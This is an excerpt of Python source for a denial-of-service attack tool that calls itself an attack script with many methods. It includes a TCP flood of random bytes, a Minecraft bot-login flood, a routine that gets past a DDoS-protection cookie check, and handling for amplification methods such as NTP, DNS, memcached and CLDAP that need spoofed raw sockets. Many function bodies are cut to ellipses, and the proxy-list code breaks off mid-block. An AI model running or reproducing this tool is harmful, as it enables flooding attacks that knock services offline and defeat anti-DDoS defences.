...
class Tools:
    ...
    def dgb_solver(url, ua, pro=None):
        ...
        with Session() as s:
            ...
            with s.post("https://check.None-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            ...
            with s.get(f"{url}.well-known/None-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s
...
class Layer4(Thread):
    ...
    def TCP(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(574)):
                continue
        Tools.safe_close(s)
    ...
    def MCBOT(self) -> None:
        ...
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                        ...
                                                        uuid4()))
            Tools.send(s, Minecraft.login(f"{con['FANTASTICBOT']}{ProxyTools.Random.rand_str(5)}"))
            sleep(1.5)
...
class ToolsConsole:
    ...
    def usage():
        print((
                  '* FantasticNone - None Attack Script With %d Methods\n'
...
def handleProxyList(con, proxy_li, proxy_ty, url=None):
    ...
    if not proxy_li.exists():
        ...
        with proxy_li.open("w") as wr:
            ...
            if not Proxies:
                exit(
                    "Pemeriksaan Proxy gagal, Jaringan Anda mungkin yang bermasalah"
                    " | Target mungkin tidak tersedia."
                )
            stringBuilder = ""
          ...
          with suppress(IndexError):
              ...
              if method in Methods.LAYER7_METHODS:
                  ...
                  if method == "BOMB":
                      assert (
                          ...
                          "Install bombardier: "
                          "https://github.com/FantasticNone/FantasticNone/wiki/BOMB-method"
                      )
                  ...
                  if threads > 37682:
                      logger.warning("Thread is higher than 37682")
                  if rpc > 37682:
                      logger.warning(
                          "RPC (Request Pre Connection) is higher than 37682")
              ...
              if method in Methods.LAYER4_METHODS:
                  ...
                  if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN"} and \
                      ...
                      exit("Tidak Dapat Membuat Soket Mentah")

                  if method in Methods.LAYER4_AMP:
                      logger.warning("metode ini membutuhkan server spoofable, silakan periksa")
                      logger.warning("https://github.com/FantasticNone/FantasticNone/wiki/Amplification-None-attack")
              ...
              logger.info(
                  f"{bcolors.FAIL}Attack Started to{bcolors.OKGREEN} %s{bcolors.FAIL} with{bcolors.OKGREEN} %s{bcolors.FAIL} method for{bcolors.OKGREEN} %s{bcolors.FAIL} seconds, threads:{bcolors.OKGREEN} %d{bcolors.FAIL}!{bcolors.RESET}"
